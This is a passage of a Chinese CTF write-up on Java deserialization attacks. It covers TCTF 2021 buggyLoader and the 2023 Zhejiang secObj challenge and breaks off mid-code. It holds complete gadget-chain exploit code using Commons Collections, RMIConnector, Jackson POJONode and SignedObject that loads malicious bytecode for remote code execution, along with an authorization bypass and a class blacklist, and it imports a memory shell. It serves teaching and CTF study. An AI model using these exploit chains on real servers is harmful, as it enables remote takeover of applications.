+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">lazyMap</span><span class="o">,</span><span class="s">"factory"</span><span class="o">,</span><span class="n">connect</span><span class="o">);</span>
+        <span class="kt">byte</span><span class="o">[]</span> <span class="n">serialize</span> <span class="o">=</span> <span class="n">serialize</span><span class="o">(</span><span class="n">hashMap1</span><span class="o">);</span>
+        <span class="n">unserialize</span><span class="o">(</span><span class="n">serialize</span><span class="o">);</span>
+    <span class="o">}</span>
+
+<span class="o">}</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240227200015-c49cbfb6-d567-1.png"/></p>
+<p>调用栈</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">findRMIServerJRMP:1993, RMIConnector (javax.management.remote.rmi)</span>
+<span class="l l-Scalar l-Scalar-Plain">findRMIServer:1924, RMIConnector (javax.management.remote.rmi)</span>
+<span class="l l-Scalar l-Scalar-Plain">connect:287, RMIConnector (javax.management.remote.rmi)</span>
+<span class="l l-Scalar l-Scalar-Plain">connect:249, RMIConnector (javax.management.remote.rmi)</span>
+<span class="l l-Scalar l-Scalar-Plain">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span>
+<span class="l l-Scalar l-Scalar-Plain">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span>
+<span class="l l-Scalar l-Scalar-Plain">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span>
+<span class="l l-Scalar l-Scalar-Plain">invoke:498, Method (java.lang.reflect)</span>
+<span class="l l-Scalar l-Scalar-Plain">transform:125, InvokerTransformer (org.apache.commons.collections.functors)</span>
+<span class="l l-Scalar l-Scalar-Plain">get:151, LazyMap (org.apache.commons.collections.map)</span>
+<span class="l l-Scalar l-Scalar-Plain">getValue:73, TiedMapEntry (org.apache.commons.collections.keyvalue)</span>
+<span class="l l-Scalar l-Scalar-Plain">hashCode:120, TiedMapEntry (org.apache.commons.collections.keyvalue)</span>
+<span class="l l-Scalar l-Scalar-Plain">hash:339, HashMap (java.util)</span>
+<span class="l l-Scalar l-Scalar-Plain">readObject:1413, HashMap (java.util)</span>
+</pre></div>
+<h1 data-content="1" id="4da5e42de3cce3ccc39dcb6a99d6ecb1">例题分析</h1>
+<h2 data-content="1" id="bdfd1ad6865c09bce7ab632f74f2d002">[TCTF 2021]buggyLoader</h2>
+<p><a href="https://github.com/waderwu/javaDeserializeLabs" target="_blank">https://github.com/waderwu/javaDeserializeLabs</a></p>
+<h3 data-content="1" id="d1e336458dac2128162b2e3777356eb7">考点分析</h3>
+<ol>
+<li>Java代码审计</li>
+<li>Java RMIConnector 二次反序列化</li>
+</ol>
+<p>对传进来的data参数进行了hex的处理，处理过后用自定义的<code>MyObjectInputStream</code>​来处理字节，然后满足属性直接反序列化</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240227200101-e07f8254-d567-1.png"/></p>
+<p>先来看看​<code>hexStringToBytes</code>​</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240227200113-e716dc16-d567-1.png"/></p>
+<p>就是个hex解码而已</p>
+<p>然后看自定义的<code>MyObjectInputStream</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240227200127-effab1fe-d567-1.png"/></p>
+<p>可以看到重写了resolveClass方法，使用了<code>URLClassLoader.loadClass()</code>​而非默认的<code>Class.forName()</code>​去加载类</p>
+<h3 data-content="1" id="18cbbb6c3610ed133ddb3e724d9cff6f">关于ResolveClass</h3>
+<p>在Java中，当使用<code>ObjectInputStream</code>​进行反序列化时，<code>resolveClass()</code>​方法会默认被调用，其作用就是对类进行验证和加载，具体来说，当反序列化一个对象时，如果该对象包含的类尚未被加载，那么<code>ObjectInputStream</code>​就会调用<code>resolveClass()</code>​方法来加载该类。resolveClass()方法的默认实现会使用当前线程的上下文<code>ClassLoader</code>​来加载类,即<code>Class.forName()</code>​</p>
+<p>另外，<code>resolveClass()</code>​方法还可以用于防止恶意攻击，比如通过序列化和反序列化来注入恶意代码或者执行非法操作。通过在​<code>resolveClass()</code>​方法中实现自定义的安全检查逻辑，做一些过滤处理，例如过滤一些危险类JNDI、RMI、TemplatesImpl等，可以有效地增强反序列化的安全性。</p>
+<h3 data-content="1" id="f2270777888f9d83876fba63ea6d53c6">依赖</h3>
+<p>查看下依赖，可以发现存在CC的依赖，那么直接打CC就好了</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240227200142-f8e38246-d567-1.png"/></p>
+<h3 data-content="1" id="091b08d6df12755df03e11c3a13ae772">坑点</h3>
+<p>但是<code>URLClassLoader.loadClass()</code>​跟默认的<code>Class.forName()</code>​有啥区别呢？</p>
+<p>区别在于<code>URLClassLoader.loadClass()</code>​不能够加载数组，举个例子：</p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">test</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"[[B"</span><span class="o">));</span>  <span class="c1">// class [[B</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">URLClassLoader</span><span class="o">.</span><span class="na">getSystemClassLoader</span><span class="o">().</span><span class="na">loadClass</span><span class="o">(</span><span class="s">"[[B"</span><span class="o">));</span>  <span class="c1">// ClassNotFoundException</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240227200156-012257de-d568-1.png"/></p>
+<p>那么既然是因为这个，所以我们的数组的payload就无法使用了，因为在打CC的过程当中基本都会带上<code>ChainedTransformer</code>​来链式调用，或者在最后的Sink的点的时候会用到<code>TemplatesImpl</code>​来加载<code>byte[][]</code>​字节码，但是这里就都没办法使用了，当然了不使用<code>ChainedTransformer</code>​链式调用一个一个手动来触发也是可以的，但是因为存在<code>RMIConnector</code>​进行二次反序列化会更加方便，因为我们可以只需要单<code>InvokerTransformer</code>​来进行反射调用<code>connect()</code>​方法即可，那么写出EXP</p>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.Transformer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.keyvalue.TiedMapEntry</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">javax.management.remote.JMXServiceURL</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.management.remote.rmi.RMIConnector</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ByteArrayOutputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.nio.file.Files</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.nio.file.Paths</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Base64</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">buggyLoader</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setFieldValue</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">,</span><span class="n">String</span> <span class="n">fieldname</span><span class="o">,</span><span class="n">Object</span> <span class="n">value</span><span class="o">)</span><span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
+        <span class="n">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">fieldname</span><span class="o">);</span>
+        <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">field</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span><span class="n">value</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="n">HashMap</span> <span class="nf">getObject</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
+        <span class="c1">//cc6的HashMap链</span>
+        <span class="kt">byte</span><span class="o">[]</span> <span class="n">payloads</span> <span class="o">=</span> <span class="n">Files</span><span class="o">.</span><span class="na">readAllBytes</span><span class="o">(</span><span class="n">Paths</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"D:\\Security-Testing\\Java-Sec\\Java-Sec-Payload\\target\\classes\\Evail_Class\\Calc_Ab.class"</span><span class="o">));</span>
+        <span class="n">TemplatesImpl</span> <span class="n">obj</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TemplatesImpl</span><span class="o">();</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">"_bytecodes"</span><span class="o">,</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[][]{</span><span class="n">payloads</span><span class="o">});</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">"_name"</span><span class="o">,</span> <span class="s">"a"</span><span class="o">);</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">"_tfactory"</span><span class="o">,</span> <span class="k">new</span> <span class="n">TransformerFactoryImpl</span><span class="o">());</span>
+
+        <span class="n">Transformer</span> <span class="n">transformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"newTransformer"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{});</span>
+
+        <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
+        <span class="n">Map</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">lazyMap</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">map</span><span class="o">,</span> <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="mi">1</span><span class="o">));</span>
+        <span class="n">TiedMapEntry</span> <span class="n">tiedMapEntry</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TiedMapEntry</span><span class="o">(</span><span class="n">lazyMap</span><span class="o">,</span> <span class="n">obj</span><span class="o">);</span>
+
+
+        <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">expMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
+        <span class="n">expMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">tiedMapEntry</span><span class="o">,</span> <span class="s">"test"</span><span class="o">);</span>
+        <span class="n">lazyMap</span><span class="o">.</span><span class="na">remove</span><span class="o">(</span><span class="n">obj</span><span class="o">);</span>
+
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">lazyMap</span><span class="o">,</span><span class="s">"factory"</span><span class="o">,</span> <span class="n">transformer</span><span class="o">);</span>
+
+        <span class="k">return</span> <span class="n">expMap</span><span class="o">;</span>
+    <span class="o">}</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">bytesTohexString</span><span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span><span class="o">)</span> <span class="o">{</span>
+        <span class="c1">//题目要求16进制</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">bytes</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span>
+            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="n">StringBuilder</span> <span class="n">ret</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuilder</span><span class="o">(</span><span class="mi">2</span> <span class="o">*</span> <span class="n">bytes</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
+        <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">bytes</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
+            <span class="kt">int</span> <span class="n">b</span> <span class="o">=</span> <span class="mh">0xF</span> <span class="o">&amp;</span> <span class="n">bytes</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="o">;</span>
+            <span class="n">ret</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"0123456789abcdef"</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">b</span><span class="o">));</span>
+            <span class="n">b</span> <span class="o">=</span> <span class="mh">0xF</span> <span class="o">&amp;</span> <span class="n">bytes</span><span class="o">[</span><span class="n">i</span><span class="o">];</span>
+            <span class="n">ret</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"0123456789abcdef"</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">b</span><span class="o">));</span>
+        <span class="o">}</span>
+        <span class="k">return</span> <span class="n">ret</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="c1">//获取exp的base64编码</span>
+        <span class="n">ByteArrayOutputStream</span> <span class="n">tser</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
+        <span class="n">ObjectOutputStream</span> <span class="n">toser</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="n">tser</span><span class="o">);</span>
+        <span class="n">toser</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">getObject</span><span class="o">());</span>
+        <span class="n">toser</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+
+        <span class="n">String</span> <span class="n">exp</span><span class="o">=</span> <span class="n">Base64</span><span class="o">.</span><span class="na">getEncoder</span><span class="o">().</span><span class="na">encodeToString</span><span class="o">(</span><span class="n">tser</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">());</span>
+
+        <span class="c1">//创建恶意的RMIConnector</span>
+        <span class="n">JMXServiceURL</span> <span class="n">jmxServiceURL</span> <span class="o">=</span> <span class="k">new</span> <span class="n">JMXServiceURL</span><span class="o">(</span><span class="s">"service:jmx:rmi://"</span><span class="o">);</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">jmxServiceURL</span><span class="o">,</span> <span class="s">"urlPath"</span><span class="o">,</span> <span class="s">"/stub/"</span><span class="o">+</span><span class="n">exp</span><span class="o">);</span>
+        <span class="n">RMIConnector</span> <span class="n">rmiConnector</span> <span class="o">=</span> <span class="k">new</span> <span class="n">RMIConnector</span><span class="o">(</span><span class="n">jmxServiceURL</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+
+        <span class="c1">//使用InvokerTransformer 调用 connect 方法</span>
+        <span class="n">InvokerTransformer</span> <span class="n">invokerTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"connect"</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+
+        <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
+        <span class="n">Map</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">lazyMap</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">map</span><span class="o">,</span> <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="mi">1</span><span class="o">));</span>
+        <span class="n">TiedMapEntry</span> <span class="n">tiedMapEntry</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TiedMapEntry</span><span class="o">(</span><span class="n">lazyMap</span><span class="o">,</span> <span class="n">rmiConnector</span><span class="o">);</span>
+
+        <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">expMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
+        <span class="n">expMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">tiedMapEntry</span><span class="o">,</span> <span class="s">"test"</span><span class="o">);</span>
+        <span class="n">lazyMap</span><span class="o">.</span><span class="na">remove</span><span class="o">(</span><span class="n">rmiConnector</span><span class="o">);</span>
+
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">lazyMap</span><span class="o">,</span><span class="s">"factory"</span><span class="o">,</span> <span class="n">invokerTransformer</span><span class="o">);</span>
+
+        <span class="c1">//序列化</span>
+        <span class="n">ByteArrayOutputStream</span> <span class="n">baos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
+        <span class="n">ObjectOutputStream</span> <span class="n">oos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="n">baos</span><span class="o">);</span>
+        <span class="n">oos</span><span class="o">.</span><span class="na">writeUTF</span><span class="o">(</span><span class="s">"SJTU"</span><span class="o">);</span>
+        <span class="n">oos</span><span class="o">.</span><span class="na">writeInt</span><span class="o">(</span><span class="mi">1896</span><span class="o">);</span>
+        <span class="n">oos</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">expMap</span><span class="o">);</span>
+        <span class="n">oos</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">bytesTohexString</span><span class="o">(</span><span class="n">baos</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">()));</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+<p>在序列化的时候加入他的属性即可成功RCE</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240227200614-9afa4ef2-d568-1.png"/></p>
+<h2 data-content="1" id="8640f80e57cfc60aeb0c857ad9a84e37">2023浙江省赛 secObj</h2>
+<p>考点：</p>
+<ol>
+<li>Spring Security 权限绕过(设计缺陷)</li>
+<li>Java代码审计</li>
+</ol>
+<p>给了jar，看目录结构如下</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240227200632-a569e988-d568-1.png"/></p>
+<h3 data-content="1" id="d461d0ee5950ac676c1e6eb0f4d40981">权限绕过</h3>
+<p>配置文件是端口，发现存在SecurityConfig先看这个</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240227200643-ac3ab512-d568-1.png"/></p>
+<p>发现使用的<code>antMatcher</code>​的匹配方式并且后面并不是<code>/**</code>​直接随便绕过</p>
+<p>因为在<code>antMatcher</code>​中  <code>/admin/*</code>​实际上只匹配一层资源，也就是只能匹配到<code>admin.do</code>​这样或者直接路由为<code>/admin</code>​这样</p>
+<p>但是很神奇的事情发生了，<code>admin</code>​仅仅是根路由，并不是直接映射的(我感觉是出题人设计缺陷吧)</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240227200657-b48de32e-d568-1.png"/></p>
+<p>直接访问<code>/admin/user/hello</code>​即可</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240227200705-b92b0da8-d568-1.png"/></p>
+<h3 data-content="1" id="0f38bd3e6bd5ceea13fe31afda64672f">审计分析</h3>
+<p>其实有代码的就这个路由，传入一个data，使用自定义的反序列化写法进行反序列化</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240227200714-be5a62ce-d568-1.png"/></p>
+<p>跟进下<code>MyObjectInputStream</code>​，一样是重写了​<code>resolveClass</code>​</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240227200723-c3b23684-d568-1.png"/></p>
+<p>禁用了这些关键字</p>
+<div class="highlight"><pre><span></span><span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span><span class="o">[]</span> <span class="n">blackList</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">"AbstractTranslet"</span><span class="o">,</span> <span class="s">"Templates"</span><span class="o">,</span> <span class="s">"TemplatesImpl"</span><span class="o">,</span> <span class="s">"javax.management"</span><span class="o">,</span> <span class="s">"swing"</span><span class="o">,</span> <span class="s">"awt"</span><span class="o">,</span> <span class="s">"fastjson"</span><span class="o">};</span>
+</pre></div>
+<p>那么接下来就是来看怎么打反序列化了，存在以上黑名单而且发现只有一个jackson依赖可以利用，JDK自带的<code>TemplatesImpl</code>​也被过滤了，所以想到二次反序列化，那么问题就变成如何触发getter了</p>
+<h3 data-content="1" id="49e512149781da3b9175d941d435a0b4">二次反序列化</h3>
+<p>上面也讲到存在jackson关键依赖，所以我们就可以用jackson中的<code>POJONode</code>​来调用getter方法来触发SignedObject的二次反序列化</p>
+<p>但是这里遇到一个问题，二次打什么链呢？这里其实就是归结于如何调用getter的方法了，而这里的环境都是自带的jdk+spring，所以说多也不算多说少也不算少的方法，以下就写出方式的调用链(其实就是 1 2 3 排列组合为113 223 123这样子)，就写出一种EXP</p>
+<h4 data-content="1" id="0e0335a15531a19273921207d2ef3289">方法一</h4>
+<div class="highlight"><pre><span></span><span class="n">HashMap</span><span class="err">#</span><span class="n">readObject</span><span class="o">()</span> <span class="o">-&gt;</span> <span class="n">HashMap</span><span class="err">#</span><span class="n">putVal</span><span class="o">()</span> <span class="o">-&gt;</span> <span class="n">HotSwappableTargetSource</span><span class="err">#</span><span class="n">equals</span><span class="o">()</span> <span class="o">-&gt;</span> <span class="n">XString</span><span class="err">#</span><span class="n">equals</span><span class="o">()</span> <span class="o">-&gt;</span> <span class="n">ToStringBean</span><span class="err">#</span><span class="n">toString</span><span class="o">()</span> <span class="o">-&gt;</span><span class="n">POJONode</span><span class="err">#</span><span class="n">toString</span><span class="o">()</span> <span class="o">-&gt;</span> <span class="n">SignedObject</span><span class="err">#</span><span class="n">getObject</span><span class="o">()</span> <span class="o">-&gt;</span> <span class="n">BadAttributeValueExpException</span><span class="err">#</span><span class="n">readObject</span><span class="o">()</span> <span class="o">-&gt;</span> <span class="n">BaseJsonNode</span><span class="err">#</span><span class="n">toString</span><span class="o">()</span> <span class="o">-&gt;</span> <span class="n">TemplatesImpl</span><span class="err">#</span><span class="n">getOutputProperties</span><span class="o">()</span>
+</pre></div>
+<h4 data-content="1" id="c09eec8d1d83983e5d1de19288110c1c">方法二</h4>
+<div class="highlight"><pre><span></span><span class="n">BadAttributeValueExpException</span><span class="err">#</span><span class="n">readObject</span><span class="o">()</span> <span class="o">-&gt;</span> <span class="n">ToStringBean</span><span class="err">#</span><span class="n">toString</span><span class="o">()</span> <span class="o">-&gt;</span><span class="n">POJONode</span><span class="err">#</span><span class="n">toString</span><span class="o">()</span> <span class="o">-&gt;</span> <span class="n">SignedObject</span><span class="err">#</span><span class="n">getObject</span><span class="o">()</span> <span class="o">-&gt;</span> <span class="n">BadAttributeValueExpException</span><span class="err">#</span><span class="n">readObject</span><span class="o">()</span> <span class="o">-&gt;</span> <span class="n">BaseJsonNode</span><span class="err">#</span><span class="n">toString</span><span class="o">()</span> <span class="o">-&gt;</span> <span class="n">TemplatesImpl</span><span class="err">#</span><span class="n">getOutputProperties</span><span class="o">()</span>
+</pre></div>
+<h4 data-content="1" id="a21cc3a27d1454d206f1cf97f70026bf">方法三</h4>
+<div class="highlight"><pre><span></span><span class="n">HashMap</span><span class="err">#</span><span class="n">readObject</span><span class="o">()</span> <span class="o">-&gt;</span> <span class="n">HashMap</span><span class="err">#</span><span class="n">putVal</span><span class="o">()</span> <span class="o">-&gt;</span> <span class="n">HotSwappableTargetSource</span><span class="err">#</span><span class="n">equals</span><span class="o">()</span> <span class="o">-&gt;</span> <span class="n">XString</span><span class="err">#</span><span class="n">equals</span><span class="o">()</span> <span class="o">-&gt;</span> <span class="n">ToStringBean</span><span class="err">#</span><span class="n">toString</span><span class="o">()</span> <span class="o">-&gt;</span><span class="n">POJONode</span><span class="err">#</span><span class="n">toString</span><span class="o">()</span> <span class="o">-&gt;</span> <span class="n">SignedObject</span><span class="err">#</span><span class="n">getObject</span><span class="o">()</span> <span class="o">-&gt;</span> <span class="n">HashMap</span><span class="err">#</span><span class="n">readObject</span><span class="o">()</span> <span class="o">-&gt;</span> <span class="n">HashMap</span><span class="err">#</span><span class="n">putVal</span><span class="o">()</span> <span class="o">-&gt;</span> <span class="n">HotSwappableTargetSource</span><span class="err">#</span><span class="n">equals</span><span class="o">()</span> <span class="o">-&gt;</span> <span class="n">XString</span><span class="err">#</span><span class="n">equals</span><span class="o">()</span> <span class="o">-&gt;</span> <span class="n">ToStringBean</span><span class="err">#</span><span class="n">toString</span><span class="o">()</span> <span class="o">-&gt;</span><span class="n">POJONode</span><span class="err">#</span><span class="n">toString</span><span class="o">()</span>  <span class="o">-&gt;</span> <span class="n">TemplatesImpl</span><span class="err">#</span><span class="n">getOutputProperties</span><span class="o">()</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">MenShell.SpringMemShell</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.fasterxml.jackson.databind.node.POJONode</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.bcel.internal.Repository</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xpath.internal.objects.XString</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javassist.ClassPool</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javassist.CtClass</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javassist.CtMethod</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.springframework.aop.framework.AdvisedSupport</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.springframework.aop.target.HotSwappableTargetSource</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">javax.management.BadAttributeValueExpException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.xml.transform.Templates</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ByteArrayOutputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.*</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.nio.file.Files</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.nio.file.Paths</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.security.*</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Base64</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">SignedObjectBAVEPoC</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+
+        <span class="n">ClassPool</span> <span class="n">pool</span> <span class="o">=</span> <span class="n">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">();</span>
+        <span class="n">CtClass</span> <span class="n">ctClass0</span> <span class="o">=</span> <span class="n">pool</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"com.fasterxml.jackson.databind.node.BaseJsonNode"</span><span class="o">);</span>
